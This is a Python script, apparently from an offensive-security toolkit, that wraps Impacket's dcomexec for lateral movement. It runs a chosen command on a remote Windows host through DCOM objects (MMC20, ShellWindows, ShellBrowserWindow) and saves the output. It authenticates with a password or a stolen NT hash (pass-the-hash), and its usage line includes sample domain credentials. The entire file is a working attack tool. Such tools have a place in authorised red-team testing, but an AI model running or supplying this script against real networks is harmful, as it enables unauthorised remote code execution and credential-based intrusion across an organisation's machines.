#!/usr/bin/env python3
"""Execute a command remotely through Impacket DCOMExec and save output.

Usage:
  python skills/movement/scripts/dcom_exec.py -d corp.local -u alice -p Passw0rd! --target 10.0.0.25 --command "whoami" --object MMC20 -o ./dcom.txt
"""

from __future__ import annotations

import argparse
import json
import shutil
import subprocess
import sys
from pathlib import Path


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="DCOMExec wrapper.")
    parser.add_argument("-d", "--domain", required=True)
    parser.add_argument("-u", "--user", required=True)
    auth = parser.add_mutually_exclusive_group(required=True)
    auth.add_argument("-p", "--password")
    auth.add_argument("-H", "--hash", dest="nt_hash")
    parser.add_argument("--target", required=True)
    parser.add_argument("--command", required=True)
    parser.add_argument(
        "--object",
        default="MMC20",
        choices=["MMC20", "ShellWindows", "ShellBrowserWindow"],
    )
    parser.add_argument("-o", "--output", required=True)
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    output_file = Path(args.output).resolve()
    output_file.parent.mkdir(parents=True, exist_ok=True)

    tool = shutil.which("impacket-dcomexec") or shutil.which("dcomexec.py")
    target = f"{args.domain}/{args.user}@{args.target}"
    command = [tool or "impacket-dcomexec", "-object", args.object, target]
    if args.password:
        command.extend(["-password", args.password])
    else:
        command.extend(["-hashes", args.nt_hash])
    command.extend(["-nooutput", args.command])

    payload = {
        "tool": tool or "impacket-dcomexec",
        "tool_found": bool(tool),
        "object": args.object,
        "command": command,
        "output_file": str(output_file),
    }

    if not tool:
        print("[!] dcomexec not found. Printing command only.", file=sys.stderr)
        print(" ".join(command))
        print(json.dumps(payload, indent=2, ensure_ascii=False))
        return 0

    result = subprocess.run(command, capture_output=True, text=True, check=False)
    combined = f"{result.stdout}\n{result.stderr}".strip() + "\n"
    output_file.write_text(combined, encoding="utf-8")
    payload["return_code"] = result.returncode
    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0 if result.returncode == 0 else result.returncode


if __name__ == "__main__":
    raise SystemExit(main())
